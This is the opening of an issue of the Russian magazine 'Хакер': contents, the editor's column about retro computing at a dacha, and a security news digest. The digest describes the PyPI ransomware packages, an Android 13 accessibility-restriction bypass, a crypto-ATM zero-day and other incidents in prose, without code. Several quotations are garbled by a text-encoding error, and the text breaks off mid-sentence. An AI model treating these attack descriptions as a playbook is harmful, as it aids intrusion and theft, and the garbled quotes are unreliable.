
                                                           август 2022
            № 281
CONTENTS

    Лето в стиле ретро
  За мет ки главреда, затерян ного в прос транстве и вре мени

    MEGANews
  Самые важные события в мире инфо сека за август

    Картошка-0
  По выша ем привилегии в AD при помощи RemotePotato0

    Суровая жаба
  Изучаем защиту Excelsior JET для программ на Java

    Анатомия эльфов 2
  Разбира ем устрой ство ELF-файлов в подробностях

    Фундаментальные основы хакерства
  Затрудняем ана лиз программ

    Дальше в лес
  Как работают ата ки на доверенные отно шения доменов и лесов AD

    AEPIC Leak
  Изучаем нашумевшую уязвимость в про цес сорах Intel

    HTB Retired
  Пишем эксплоит ROP + mprotect и используем переполнение буфера

    HTB OverGraph
  Извле каем данные через цепоч ку Open Redirect, RXXS и CSTI

    HTB Late
  Эксплу атируем инъекцию шаблонов в сервисе обработ ки изображений

    HTB Timelapse
  Ата куем Windows Remote Management и работаем с сертификатами

    Перехват VK
  Как хакеры исполь зуют кликдже кинг для деаноними зации

    Винда на айфоне
  Ис пользуем виртуал ку UTM для установки Windows на iOS

    Искусство пайки
  Выбира ем инструменты, приборы и расходни ки для домашней мастерской

    Даня снова с нами!
  Выясня ем у Дани Шеповалова, где он про падал 20 лет и при чем тут гуси

    Дмитрий Артимович
  о DDoS, scareware и изнанке жизни хакера

    Титры
  Кто дела ет этот жур нал
                              ПОДПИСКА НА «ХАКЕР»




Мы благодарим всех, кто поддерживает
редакцию и помогает нам компенсировать
авторам и редакторам их труд. Без вас
«Хакер» не мог бы существовать, и каждый
новый подписчик делает его чуть лучше.




                        Напоминаем, что дает годовая подписка:

                            год доступа ко всем материалам, уже
                        опубликованным на Xakep.ru;
                            год доступа к новым статьям, которые
                         выходят по будням;
                         полное отсутствие рекламы на сайте
                           (при условии, что ты залогинишься);
                         возможность скачивать выходящие
                       каждый месяц номера в PDF, чтобы
                           читать на любом удобном устройстве;
                       личную скидку 20%, которую
                      можно использовать для продления
                          годовой подписки. Скидка накапливается
                               с каждым продлением.

                         Если по каким-то причинам у тебя еще нет
                           подписки или она скоро кончится,
                              спеши исправить это!
HEADER





         ЗАМЕТКИ ГЛАВРЕДА,
    ЗАТЕРЯННОГО В ПРОСТРАНСТВЕ
           И ВРЕМЕНИ


Как  путешество вать  во  времени,  живя
на даче? Ответ ждет тебя в этом выпуске
колон ки  глав ного  редак тора  «Хакера»
Андрея  Письмен ного,  который  сна чала
уехал на юг стра ны, а затем нап равил ТАР-       Андрей Письменный                                                                                      Главный редактор
ДИС в начало двухтысяч ных.                                   apismenny@gmail.com


Паркую у сель по тяжело гру жен ный гигант ским арбу зом и бутылями с водой
Yamaha Gear и, не слезая со ску тера, достаю из рюк зака план шет. Пара минут,
и запись интервью улетает на расшифровку. Захожу в магаз за минералкой
и колбасой, снова завожу мотор и потихонь ку еду домой. Приятный встречный
ветерок позволяет не расплавить ся в 35 градусов. По небу, грохоча, пролетает
очеред ной Ми-24 с белой Z на боку.
  Дома ставлю минералку на стол и рассмат риваю этикет ку: «Добрый док тор
№ 4», настоль ко желающий быть «Ессенту ками», что местные так его обычно
и называют. Ну да, ну да, о паленой таган рог ской минералке писал еще Чехов.
  А вок руг на столе — компь ютеры! Современ ный Mac mini с M1, его вин -
тажный собрат на Core Duo, iPad, приш лепан ный к Magic Keyboard (о нем я уже
рассказывал),  Raspberry  Pi  3  в  красивой  коробочке,  полуразобранный
тауэр 486DX4, eMac на G3. И несколь ко старомод ных «квад ратных» монито-
ров, которые я за копейки прихватил на распродаже офисной техники.
  Переехать в ран домное селение между Ростовом-на-Дону и Таган рогом
стоило хотя бы ради того, чтобы было место для всех этих богатств. В той же
ком нате поместился телевизор с ЭЛТ — пять десят сан тимет ров диагонали
и столь ко же килог раммов массы. Под ним — первая PlayStation и стопка игр.
Metal Gear Solid, Final Fantasy IX, Resident Evil 3, Dino Crisis.
   Таковы дачные развлечения и дачная жизнь! Возможно, ты под метил ее
недостаток: чтобы отправить боль шой файл, мне приш лось куда-то ехать.
Дома он заг ружался бы много часов. И уж чего я толь ко не делал, чтобы
повысить скорость! Перебрал всех операторов, соору дил переносную мачту
с антенной, обошел с ней участок и выставлял из чердачных окон. Иног да
кажет ся, что вот они, стабиль ные 10 Мбит! Но через пару дней пойман ная
выш ка перестает ловить ся, буд то исчезает бесслед но.
   486-й я пока так и не завел, eMac тоже ждет своей очереди, зато Mac mini
2006 года выпуска раду ет меня ежед невно.





Ког да Spotify помахал нам всем ручкой, я не побежал на Яндекс Музыку. Мои
условия просто идеаль ны, чтобы вспом нить дедовский метод. Берем пачку
MP3 и по FTP шлем на старин ный Mac mini, в который вот кну ты колон ки. Слож-
новато? Сог ласен! Но тешит глу бин ный инстинкт собирателя получше, чем
стриминг.





      iTunes 11 теперь смот рится как необычный артефакт ушед шей эпохи

За ночь я лег ко скачиваю новую серию «Лучше звоните Солу», но уже прикиды -
ваю, не прикупить ли в пару к телевизору такой же вин тажный видак. А к
нему — стопку кассет: «Бегущий по лезвию», «Робот-полицейский», «Тер-
минатор», «Пятый элемент», — пусть в ужасной русской озвучке и криво под -
писан ными нак лейками... Впрочем, почему «пусть»? Так будет даже лучше!
   Как видишь, я этим летом умуд рился затерять ся не толь ко в пространстве.
Почему не рвануть в нулевые, если душа того просит? Да и связь с цивили-
зацией через слабый сиг нал далекой сотовой выш ки — ни дать ни взять ADSL
от «Стрима».
   Теперь ты знаешь, в каких временами стран ных (и стран ных времен ных?)
условиях делается «Хакер». Хотя бывали прик лючения и поэк зотичнее. Пом -
нится, пять лет назад я ждал поезда из одной тайской провин ции в дру гую
и писал очеред ную статью, вод рузив ноут бук на рюк зак. На экране — текст,
вок руг — тропическая ночь и бездомные собаки.
  Но о прик лючениях в Юго-Восточной Азии я расскажу как-нибудь в дру гой
раз. Пока же пожелайте мне благополучно вернуть ся в цивилизацию —
к  гигабит ным  каналам, широким мониторам, службам доставки и воде
из филь тра.
                                      Мария «Mifrill» Нефёдова
                                                  nefedova@glc.ru


В этом месяце: выш ла обновлен ная вер сия USB Rubber
Ducky, эксперт взло мал тер минал  Starlink с помощью
самодельного мод-чипа, фишин говая операция 0ktapus
зат ронула 130 ком паний, из крип товалют ных бан коматов
вору ют деньги, Роскомнад зор заблокиро вал Grammarly
и Patreon, песня Джа нет Джек сон ломала HDD в ста рых
ноут буках,  в  PyPI наш ли шиф ровальщика,  соз данно го
школьником, и дру гие интересные события последнего
месяца лета.





ОБНОВЛЕННАЯ USB
RUBBER DUCKY
На кон ферен ции DEF CON пред ставили обновлен ную версию инстру мен та
USB Rubber Ducky. Авторы рассказывают, что серь езно обновили DuckyScript
(язык, который исполь зует ся для создания команд), научили устройство опре-
делять, под ключено ли оно к Windows-машине или Mac, генерировать псев-
дослу чайные числа и так далее.
  Оригиналь ная «уточка» появилась боль ше десяти лет назад, и за эти годы
девайс не просто стал популярным, а даже успел засветить ся в сериале «Мис-
тер Робот». По сути, это устройство, которое выг лядит как обычная флеш ка,
эму лиру ет клавиату ру и при под ключении к компь ютеру набирает любые
задан ные в нем вредоносные коман ды.
  В этом году создатель USB Rubber Ducky Даррен Кит чен (Darren Kitchen)
привез на DEF CON новую версию устройства, стоимость которого на сегод ня
составляет 59,99 доллара США. Все 500 девайсов были распроданы на кон -
ферен ции в первый же день.
  USB Rubber Ducky и рань ше мог ла создать фаль шивое всплы вающее окно
в Windows (для сбора учет ных дан ных поль зователя) или вы нудить Chrome
отправить все сохранен ные пароли на веб-сервер злоумыш ленника. Однако
такие атаки тщатель но разрабаты вались для кон крет ных операционных систем
и версий ПО. По мнению Кит чена, им не хватало гибкости для работы на раз-
ных плат формах.
  Новейшая USB Rubber Ducky призвана преодолеть эти ограничения. Авто-
ры серь езно поработали над язы ком  DuckyScript, на котором создают ся
коман ды, исполь зуемые «уточкой» на машине жертвы. Если предыду щие вер-
сии в основном ограничивались вводом кон крет ных последователь ностей
нажатий клавиш, то DuckyScript 3.0 пред ставляет собой многофун кциональ ный
язык, позволяющий поль зователям писать фун кции, сохранять перемен ные
и исполь зовать логические элемен ты управления потоком.
  Фак тически это означает, что обновлен ное устройство может запустить тест
и определить, под ключено оно к Windows-машине или Mac, а затем выполнить
код, соот ветству ющий определен ной ОС (или отключить ся, если под ключено
к неправиль ной цели). Так же новая USB Rubber Ducky может генерировать
псевдослу чайные числа и добавлять перемен ную задержку между нажатиями
клавиш, чтобы боль ше походить на человека.
  Более того, теперь USB Rubber Ducky умеет передавать дан ные, соб-
ранные на целевой машине, переводя их в двоичный код и исполь зуя технику
Keystroke Reection , которая злоупот ребляет сиг налами, указывающими кла-
виату ре, ког да должны загорать ся светодиоды Caps Lock, Num Lock и Scroll
Lock.
   Так же Кит чен отмечает, что теперь USB Rubber Ducky ком плек тует ся па-
кетом для онлайн-разработ ки, где можно писать и ком пилировать пейлоады,
а затем заг ружать их на устройство. Поделить ся получившимися полезными
наг рузками с сообществом можно прямо на специаль ном хабе, созданном
для этих целей.


40 КРУПНЫХ УТЕЧЕК БАЗ ПЕРСОНАЛЬНЫХ ДАННЫХ
С начала 2022 года в Рос сии про изошло более 40 крупных уте чек баз пер сональ ных данных,
сообщил замглавы Рос комнад зора Милош Ваг нер на заседании общес твенного совета
ведомс тва. Из-за это го скомпро метированы оказались свыше 300 миллионов записей.

Что с утечками дела все хуже и хуже, сообщают и аналитики группы компаний InfoWatch. По их
данным, в пер вой половине 2022 года в сеть попало боль ше пер сональ ных данных, чем все
населе ние Рос сии. Все го аналитикам удалось зафиксировать 2101 утечку (на 93,2% боль ше,
чем в прошлом году), из которых в Рос сии были обнаруже ны 305 (на 45,9% боль ше в срав нении
с 2021 годом).





«ШУТОЧНЫЙ»
ШИФРОВАЛЬЩИК
В PYPI
Эк сперты ком пании Sonatype обнаружили в репозитории PyPI сразу три вре-
доносных пакета (requesys, requesrs и requesr), которые занимаются тайпсквот -
тингом и под делываются под популярный пакет Requests. Все три пакета
пред ставляли собой шифроваль щиков и, как оказалось, были созданы ску -
чающим школь ником.
  Все версии пакета requesys (был скачан около 258 раз) содержали скрипты,
которые сначала просматривали в Windows такие папки,  как Documents,
Downloads и Pictures, а затем начинали шифровать файлы. При этом вер-
сии 1.0–1.4 содержали код шифрования и дешифрования, пред ставленный
в виде откры того тек ста, а версия 1.5 уже демонстрировала обфусцирован ный
Base64 исполняемый файл, что нем ного усложняло анализ.
  Малварь исполь зовала модуль Fernet из криптографической библиотеки
для шифрования  с  сим метричным  ключом.  Fernet  так же  применялся
для генерации слу чайного ключа шифрования, которым позже жертва рас-
шифровывала дан ные.
   Если все проходило успешно и шифроваль щик запускался в системе жер-
твы, пострадавший поль зователь видел всплы вающее сообщение с инструк -
циями: ему пред лагалось через Discord связать ся с автором пакета b8ﬀ, так же
известным под ником OHR (Only Hope Remains).





Исследователи говорят, что попасть на Discord-сервер хакера мог любой жела-
ющий. Там они обнаружили канал #ransomware-notications, который содержал
список имен  поль зователей для  пят надцати  жертв, которые  установили
и запустили вредоносный пакет из PyPI. Автоматически сгенерирован ные
сообщения так же демонстрировали ключи дешифрования, которые жертвы
мог ли  исполь зовать  для  расшифровки  своих  файлов,  заблокирован ных
requesys.





Как уже было упомяну то, версия 1.5 была чуть сложнее, имела обфускацию
и поставлялась в виде 64-бит ного исполняемого файла Windows. Но в целом
этот EXE действовал так же, как малварь прош лых версий, то есть генерировал
ключ шифрования-дешифрования, заг ружал копию ключа в Discord автора,
шифровал файлы и побуждал жертв перейти в канал для спасения дан ных.
   Аналитикам без особого тру да удалось вычислить автора этого незамыс-
ловатого вредоноса: OHR (Only Hope Remains), или b8ﬀ, опубликовал код экс-
плоита на GitHub (с помет кой, что автор не несет ответствен ности в слу чае
неправомерного исполь зования) и, не скры ваясь, исполь зовал этот же ник
в PyPI, Discord, GitHub и на дру гих сайтах. Оказалось, что у OHR есть даже
канал на YouTube с доволь но безобид ными туториалами по взлому (теперь
удалены).
  Од нако тайпсквот терские пакеты не содержали никакого отказа от ответс-
твен ности, то есть в их слу чае не было никаких заявлений и уведом лений
о том, что пакеты опубликованы в рам ках этичного исследования, и OHR
не пытался удержать людей от заражения своих ПК. Напротив, сразу после
установки пакеты запускали вредоносные скрипты и начинали шифрование.
  Исследователи решили связать ся с автором шифроваль щиков и узнать
о его мотивах. B8ﬀ лег ко пошел на кон такт и сообщил Sonatype, что вымога-
тель ский скрипт в этих пакетах полностью опен сорсный и был частью проекта,
который создавался «шут ки ради». Хотя пакеты действитель но шифровали
поль зователь ские дан ные, автор заявил, что технически они безвред ны.

      «Òåõ íè÷åñêè ýòî âûìîãàòåëü áåç âûêóïà, — ñêàçàë b8ff, èìåÿ â âèäó, ÷òî
      íå òðå áóåò äåíåã ïîñëå øèôðîâàíèÿ. — Âñå êëþ÷è äåøèôðîâàíèÿ«
       [îòïðàâëÿþòñÿ] â êàíàë  #ransomware-notifications íà ìîåì ñåðâåðå
      â Discord».                »
B8ﬀ рассказал, что он из Италии, и описал себя как школь ника, который пока
просто учит ся разработ ке и лишь недавно заин тересовался эксплоитами.


      «ß áûë óäèâëåí, êîã äà ïîíÿë, êàê ëåã êî ñîçäàòü òàêîé ýêñïëîèò è íàñ-
      êîëüêî ýòî èíòå ðåñíî. ß åùå ó÷óñü â øêîëå è íà äàííûé ìîìåíò çíàþ«
       Python, Lua, HTML, íåìíîãî CPP è âñå», — ïðèçíàåòñÿ b8ff.                »
Эк сперты уведомили о своей наход ке PyPI, но получили ответ далеко не сразу.
Зато после общения со специалистами b8ﬀ сам помог предот вратить даль -
нейшие атаки и переименовал пакет requesys, чтобы разработ чики, опечатав-
шиеся в названии requests, слу чайно не заг ружали прог рамму-вымогатель. Два
дру гих пакета и вовсе были удалены из PyPI (правда, неясно, самим автором
доброволь но или администраторами PyPI).


46 ÌÈËËÈÎÍÎÂ ЗАПРОСОВ В СЕКУНДУ

В июне 2022 года неназ ванный клиент Google Cloud Armor под вер гся DDoS-атаке по про токо лу
HTTPS, которая дос тигла мощности 46 миллионов запросов в секунду (requests per second,
RPS). На текущий момент это самая мас штабная DDoS-атака такого типа в исто рии. В общей
сложности DDoS длил ся 69 мин .





Ис сле дователи считают, что за атакой сто ял бот нет Mēris, уже извес тный по другим громким
инцидентам. К примеру, осенью прошлого года он атаковал компанию «Яндекс», на тот момент
установив рекорд по мощности DDoS-атак: 21,8 миллиона RPS.





ПЕСНЯ ДЖАНЕТ
ДЖЕКСОН ЛОМАЛА
HDD
Специалист Microsoft Рэймонд Чен (Raymond Chen) поделился интересной
историей времен Windows XP. По его словам, музыкаль ный клип на песню Джа-
нет Джек сон Rhythm Nation негативно влиял на некоторые жесткие диски
со скоростью вращения 5400 об/мин, вызывая сбои в их работе.

      «Îäèí êîëëåãà ïîäåëèëñÿ ñî ìíîé èñòîðèåé î ïîääåðæêå ïðîäóê òà
      íà Windows XP. [Òîã äà] êðóï íûé ïðîèçâîäèòåëü êîìïüþòå ðîâ îáíà-«
      ðóæèë,  ÷òî  âîñïðîèçâå äåíèå  ìóçûêàëüíîãî  êëèïà Äæàíåò Äæåê ñîí
      Rhythm Nation ïðèâîäèò ê ñáîþ â ðàáîòå íåêîòîðûõ ìîäåëåé íîóò-
       áóêîâ, — ðàññêàçûâàåò ×åí. — Íå õîòåë áû ÿ îêàçàòüñÿ â ëàáîðàòîðèè,
      êîòîðóþ îíè, íàâåðíîå, ñîçäàëè äëÿ èçó÷åíèÿ ýòîé ïðîáëåìû».                »
Как  выяснили инженеры  неназванного производителя,  воспроизведение
музыкаль ного видео негативно сказывалось не толь ко на той машине, где про-
игры вался клип. Сбои возникали даже на ноут буках кон курен тов, которые поп-
росту стояли рядом.
  Оказалось,  разгадка  проста:  виновником  этих  сбоев  был  обычный
резонанс, который ком позиция Rhythm Nation вызывала у жестких дисков
со скоростью вращения 5400 об/мин (такие модели тог да исполь зовали мно-
гие производители).
   Если кому-то все еще кажет ся, что рассказ Чена зву чит как забавная и не
слиш ком правдоподобная байка, отмечу, что все официаль но: музыкаль ное
видео Rhythm  Nation действитель но признано проблемой безопасности,
и теперь MITRE присвоила ей иден тификатор CVE-2022-38392 , хотя клип вряд
ли может пред ставлять угрозу для современ ного оборудования.
  В прош лом от бага избавились весь ма радикаль ным методом. По словам
Чена, производители создали «специаль ный филь тр, который обнаруживал
и удалял нежелатель ные частоты во время воспроизведения зву ка», чтобы
избежать возникновения резонан са.

      «ß óâå ðåí, ÷òî îíè ïîâåñèëè íà ýòîò àóäèîôèëüòð öèôðîâóþ âåðñèþ
      íàê ëåéêè „Íå óäàëÿòü!“. Õîòÿ áîþñü, ÷òî çà ãîäû, ïðîøåäøèå ñ ìîìåíòà«
      âíåäðåíèÿ ýòîé õèòðîñòè, âñå óæå çàáûëè, äëÿ ÷åãî îíà íóæíà. Íàäå -
      þñü, òåïåðü èõ íîóòáóêè óæå íå ñîäåðæàò ýòîò àóäèîôèëüòð, íåîá-
      õîäèìûé äëÿ çàùèòû îò ïîâðåæäå íèé æåñòêîãî äèñêà, êîòîðûé îíè
      áîëüøå íå èñïîëüçóþò», — èðîíèçèðóåò ×åí.                »

ДУРОВ СНОВА КРИТИКУЕТ APPLE





Павел Дуров в оче ред ной раз выс тупил с критикой в адрес компании Apple. На этот раз
недоволь ство главы Telegram выз вала задер жка обновле ния мес сендже ра. В сво ем Telegram-
канале Дуров пишет, что команда мес сендже ра под готовила для поль зовате лей iOS некое
революционное обновле ние, однако оно «зас тря ло на „рас смот рении“ в Apple на две недели,
без объ ясне ния причин и какого-либо фид бэка со сто роны Apple».

         «Нас удручает, что зачас тую мы не можем рас пространить новые вер сии→       Telegram  из-за  непонят ного  „про цес са  рас смот рения“,  навязанного  всем
      мобиль ным приложе ниям тех нологичес кими монопо лис тами.
         Ес ли Telegram, одно из десяти самых популяр ных приложе ний в мире,
       получает такое отно шение, можно толь ко догадывать ся о том, с какими труд -
       ностя ми стал киваются более мел кие раз работ чики. Это не прос то деморализу-
        ет: это наносит пря мой финансовый ущерб сот ням тысяч мобиль ных приложе ний
       по все му миру.
        Ущерб [наносимый раз работ чикам] допол няет 30%-й налог, который Apple
      и Google берут с раз работ чиков приложе ний и который, по их сло вам, дол жен
      пойти на оплату ресур сов, необходимых для рас смот рения приложе ний. Регули-
      рующие органы ЕС и других стран пос тепенно начинают обращать внимание
       на эти зло упот ребле ния. Однако эко номичес кий ущерб, который Apple уже
       нанес ла тех нологичес кой отрасли, не исправить»


— Павел Дуров





РКН ЗАБЛОКИРОВАЛ
GRAMMARLY
И PATREON
В этом месяце реестр запрещен ных сайтов пополнила плат форма Patreon, где
авторы творческих произведений могут распространять свои работы по плат -
ной под писке и предоставлять под писчикам дополнитель ный кон тент. Так же
блокировка коснулась онлайн-плат формы Grammarly, созданной для помощи
при общении на английском язы ке (анализирует англоязычный текст и пред -
лагает корректировки для устранения ошибок, тона сообщения и так далее).
   Как сообщила «Роском свобода», Patreon заблокировали из-за заявления
редак ции журнала Doxa, которое было опубликовано на сайте еще 25 фев-
раля 2022 года (в нем журналисты осуждали специаль ную воен ную операцию
на территории Украины). Так как блокиру ют по HTTPS, недоступен оказался
весь сайт.
   Блокировка Grammarly, судя по всему, тоже связана с официаль ным заяв-
лением пред ставителей сервиса, где сообщалось, что он приостанавливает
работу на территории РФ и Белару си (так же из-за специаль ной воен ной опе-
рации).
  СМИ пишут, что, по дан ным Роскомнад зора, доступ к ресурсам ограничен
«в соот ветствии с рег ламен том блокировки сайтов, содержащих призывы
к массовым беспоряд кам, экстремизму, участию в незакон ных массовых акци-
ях», а основанием для этого стала ст. 15.3 закона «Об информации», каса-
ющаяся в том числе материалов, распространяющих недостоверную общес-
твен но значимую информацию под видом достоверных сообщений.


ЖЕРТВЫ РЕЖЕ ПЛАТЯТ ВЫМОГАТЕЛЯМ

Сог ласно статис тике компании Coveware, суммы выкупов, выплаченных опе рато рам вымога-
тель ской мал вари, сокращаются с пос ледне го квар тала 2021 года. Так, во вто ром квар -
тале 2022 года сред ний раз мер выкупа сос тавил 228 125 дол ларов (на 8% боль ше, чем в пер -
вом квар тале 2022 года). Однако медианный раз мер выкупа рав нялся лишь 36 360 дол ларам,
что на 51% мень ше, чем в пре дыдущем квар тале.

Тенденция к снижению наметилась еще в конце прошлого года, ког да наблюдал ся пик пла-
тежей опе рато рам вымогателей как в сред нем ( 332 168 дол ларов США), так и в медианном
( 117 116 дол ларов США) значении.





                                     Раз меры пла тежей


Де ло в том, что опе рато ры и раз работ чики RaaS все чаще пред почитают атаковать сред ние
по раз меру компании и организации, так как это несет мень ше рис ков.


Сред ний раз мер компании-жер твы снизил ся еще боль ше, пос коль ку хакеры теперь ищут более
мел кие, но финансово здо ровые организации.





Список наибо лее активных во вто ром квар тале групп вымогателей воз главила группиров ка
BlackCat (она же ALPHV), на долю которой пришлось 16,9% всех извес тных атак. За ней сле -
дует LockBit, на долю которой приходит ся 13,1% инцидентов.





                                       Продолжение статьи →
← Начало статьи





 ОБХОД ЗАЩИТЫ
 В ANDROID 13
  Разработ чики малвари для Android уже научились обходить новую защит ную
  фун кцию Restricted setting, пред ставленную Google в Android 13.
    В августе ком пания Google выпустила Android 13: новая версия ОС была
   разверну та на устройствах Google Pixel, а исходный код опубликован на AOSP.
  В этом релизе разработ чики постарались обезвредить малварь, которая
   получала мощные  разрешения,  такие  как  Accessibility  Service,  а затем
   в фоновом режиме применяла их для скрыт ного вредоносного поведения.
  К сожалению, эксперты ThreatFabric сообщили, что разработ чики малвари уже
  занимаются новыми дропперами, которые способны обойти эти ограничения.
     Эксплу атация  службы  специаль ных  возможностей  Google  Accessibility
   Service — это классическое поведение для мобиль ной малвари. Служба была
   создана, чтобы облегчить исполь зование приложений людям с ограничен ными
   возможностями, но злоумыш ленники приспособили ее для взаимодействия
  с интерфейсом системы и приложениями.
    В Android 13 инженеры Google пред ставили фун кцию Restricted setting
  («Ограничен ные настройки»), которая не позволяет сторон ним приложениям
   запрашивать привилегии службы специаль ных возможностей, ограничивая эту
  фун кцию толь ко APK-файлами из Google Play. Как сообщают исследователи, им
  самим удалось без тру да создать PoC-дроппер, который обходит новую
  защиту и получает доступ к Accessibility Services.
     Все началось с того, что эксперты обнаружили новый дроппер для Android,
  который уже умеет обходить ограничения Restricted setting. Дроппер был
  обнаружен во время наблюдения за кам паниями малвари Xenomorph и получил
   название BugDrop (из-за множества багов, которые мешали его работе на ран -
   них этапах).
     Оказалось, что код BugDrop прак тически аналогичен коду Brox — проекта,
  пред назначен ного для обу чения разработ ке малвари, который свобод но цир-
   кулиру ет на хакерских форумах. Эксперты говорят, что в BugDrop их внимание
  привлекло  наличие  Smali-строки,  которой  нет  в  исходном  коде  Brox:
   com.example.android.apis.content.SESSION_API_PACKAGE_INSTALLED.
    Дело в том, что у приложений для Android есть два способа установки дру -
   гих приложений. Первый и наиболее распространен ный — это установка
  без сеан са, который, по сути, пред ставляет собой передачу установки одного
  APK-файла установщику системного пакета.
     Второй метод на основе сеан сов позволяет приложениям выполнять уста-
  новку одного или несколь ких APK-файлов одновремен но. Этот метод обычно
  исполь зует ся приложениями в Play Store и позволяет устанавливать несколь ко
  APK-файлов за раз, при этом приложения распространяют ся в виде одного
  «базового» APK и несколь ких «разделен ных» APK.
    Фак тически исследователи обнаружили, что BugDrop стремит ся исполь -
   зовать имен но второй метод установки (на основе сеан сов, как это происходит
   в слу чае Play Store), а значит, ограничения к таким приложениям не применя-
   ются.





         «Ýòà íåáîëüøàÿ ìîäèôèêàöèÿ ïîçâîëèò ïîëíîñòüþ îáîéòè íîâûå ìåðû
         áåçîïàñíîñòè Google åùå äî  òîãî,  êàê îíè îêîí÷àòåëüíî  âñòóïÿò «
         â ñèëó», — ãîâîðÿò èññëå äîâàòåëè èç ThreatFabric.                 »
  Пока BugDrop все еще находит ся в разработ ке, и аналитики связывают его
  с хакерской группой Hakoden, которая стоит за созданием дроппера Gymdrop
  и упомяну того бан кера Xenomorph.
     Ког да BugDrop будет окон чатель но готов к массовому разверты ванию, ско-
  рее всего, его применят в кам паниях для распространения Xenomorph, атакуя
   устройства даже с новейшими версиями Android на борту. Хуже того, пос-
  ледние образцы Xenomorph, изу чен ные ThreatFabric, содержали модули уда-
  лен ного доступа, что делает эту малварь еще более опасной.


  ТОРВАЛЬДС ДОБРАЛСЯ ДО ARM





   Нес коль ко лет назад Линус Тор валь дс заяв лял, что дол го ждал ноут бука на ARM, который
   смо жет работать под Linux, но пос ле выхода устройств Apple на чипе M1 не захотел возить ся
   с ними и «бороть ся с компаниями, которые не нас тро ены помогать». Теперь же Тор валь дс
   сообщил, что исполь зует Asahi Linux на MacBook Air с про цес сором M2. Этот дис трибутив
   стро ится на реверс-инжиниринге аппарат ного обес печения Apple, и основная цель команды
   Asahi — внес ти все свои наработ ки в основное ядро Linux, что бы про чие дис трибутивы тоже
   мог ли этим вос поль зовать ся.
             «Я ждал это го долгое вре мя, и наконец это стало реаль ностью благодаря →
         команде  Asahi. У нас уже дав но есть обо рудо вание ARM64, работающее
         под управле нием Linux, но до сих пор оно не исполь зовалось в качес тве плат -
        формы для раз работ ки. Это тре тий раз, ког да я исполь зую обо рудо вание Apple
         для раз работ ки Linux. Я делал так мно го лет назад, во вре мя раз работ ки
         PowerPC на машине PPC 970. Затем, более десяти лет назад, ког да MacBook
             Air был единс твенным по-нас тояще му тонким и лег ким, а теперь — плат форма
        ARM64»


  — Линус Тор валь дс





 ОГРАБЛЕНИЯ
 КРИПТОВАЛЮТНЫХ
 БАНКОМАТОВ
  В криптовалют ных бан коматах General Bytes обнаружили уязвимость нулевого
   дня, которую злоумыш ленники тут же исполь зовали для кражи средств. Ког да
  поль зователи вносили или покупали криптовалюту через бан комат, день ги
   получали хакеры.
    Чеш ская ком пания General Bytes владеет и управляет 8827 криптовалют -
  ными бан коматами, которые доступны более чем в 120 странах мира. Эти
   устройства позволяют покупать и продавать более 40 различных криптовалют
  и  кон тролиру ются  удален ным CAS-сервером  (Crypto  Application  Server),
  который управляет работой бан комата, проводит операции с под держиваемы -
  ми криптовалютами, а так же выполняет покупку и продажу на биржах.
     Сог ласно  бюллетеню  безопасности   General   Bytes,   опубликован -
  ному 18 августа 2022 года, атаки на бан коматы проводились с исполь зовани-
  ем 0-day-уязвимости в CAS-сервере ком пании.

        «Çëîóìûøëåííèê ìîã óäàëåííî ñîçäàòü ïîëüçîâàòå ëÿ‑àäìèíèñòðàòîðà
         ÷åðåç àäìèíèñòðàòèâíûé èíòåðôåéñ CAS (ïîñðåäñòâîì âûçîâà URL- «
        àäðå ñà íà ñòðàíèöå, êîòîðàÿ èñïîëüçóåòñÿ äëÿ óñòàíîâêè ïî óìîë÷àíèþ
        è ñîçäàíèÿ ïåðâîãî ïîëüçîâàòå ëÿ‑àäìèíèñòðàòîðà), — ãëàñèò îò÷åò. —
        Ýòà óÿçâèìîñòü ïðèñóòñòâóåò â CAS, íà÷èíàÿ ñ âåðñèè 20201208».                 »
  Специалисты  General  Bytes  полагают,  что злоумыш ленники  сканировали
   интернет в поисках серверов с откры тыми TCP-портами 7777 или 443, включая
  серверы, размещен ные в  Digital Ocean и собствен ном облачном сервисе
   General Bytes.
     Затем хакеры исполь зовали уязвимость, чтобы добавить в систему дефол-
   тного поль зователя-администратора с именем gb и изменить настройки
  для покупки и продажи криптовалюты, а так же настройку invalid payment address
  («Недействитель ный платежный адрес»), внед рив в систему адрес своего
  кошель ка. В итоге любая криптовалюта, получен ная CAS, попадала в руки
   хакеров.
     Пред ставители General Bytes предупредили клиентов, что нель зя исполь -
   зовать криптовалют ные бан коматы, пока на них не будут установлены пат -
   чи 20220531.38 и 20220725.22. Так же ком пания опубликовала под робный
  список действий, которые необходимо выполнить на устройствах, прежде чем
   те снова будут введены в эксплу атацию. В числе прочего рекомен дует ся изме-
   нить настройки бран дмауэра, чтобы доступ к интерфейсу администратора CAS
  был возможен толь ко с авторизован ных IP-адресов.
     При этом из сообщения ком пании неясно, сколь ко серверов было ском про-
  метировано и сколь ко имен но криптовалюты украли у поль зователей.


 ИМИТАЦИЯ SKYPE, ADOBE READER И VLC PLAYER

   Аналитики VirusTotal изучили методы, которые опе рато ры мал вари исполь зуют для обхо да
   защиты и повыше ния эффектив ности социаль ной инже нерии. Иссле дование показало, что зло -
   умышленники все чаще имитируют такие легитимные приложе ния, как Skypþ, Aýoûþ Rþúýþr
   и VLC Plúyþr , что бы заво евать доверие жертв.

   Также хакеры мас кируют свои прог раммы под 7-ZĂp, TþúmVĂþwþr , CClþúnþr , MĂürosoÿt
   EýĀþ, Stþúm, Zoom и WāútsApp.

  В общей сложности экспер ты обнаружили не менее 2,5 миллиона подоз ритель ных файлов,
   заг руженных через 101 домен, вхо дящий в список 1000 лучших сайтов по вер сии Alexa.





 АТАКА КЛОНОВ
 НА GITHUB
  Разработ чик Стивен Лейси  (Stephen  Lacy)  взбу доражил ИБ-сообщество,
   заявив  в  Twitter,  что обнаружил «масштабную  атаку вредоносного ПО»
  на GitHub, зат ронувшую около 35 тысяч репозиториев. Однако оказалось, что
   речь шла не о ком прометации или взломе: обнаружен ные репозитории ока-
   зались форками (копиями) дру гих проектов, созданны ми специаль но для рас-
  пространения малвари.
    Исходный твит Лейси не на шут ку встревожил сообщество, ведь исследова-
   тель заявлял, что обнаружил заражение малварью 35 тысяч репозиториев
  и атака зат ронула такие известные проекты, как Crypto, Golang, Python, JS,
   Bash, Docker и K8s. К сожалению, многие не читали даль ше первого сооб-
  щения, а в последу ющем треде Лейси объяснил, что выразился не совсем кор-
   рек тно.
     Хотя создание форков — обычная прак тика и даже поощряет ся среди раз-
  работ чиков, в этом слу чае злоумыш ленники создавали копии чужих проектов
  и заражали их вредоносным кодом, чтобы атаковать ничего не подозревающих
   разработ чиков через эти вредоносные клоны.
     Все началось с того, что Лейси изу чал некий опен сорсный проект, «найден -
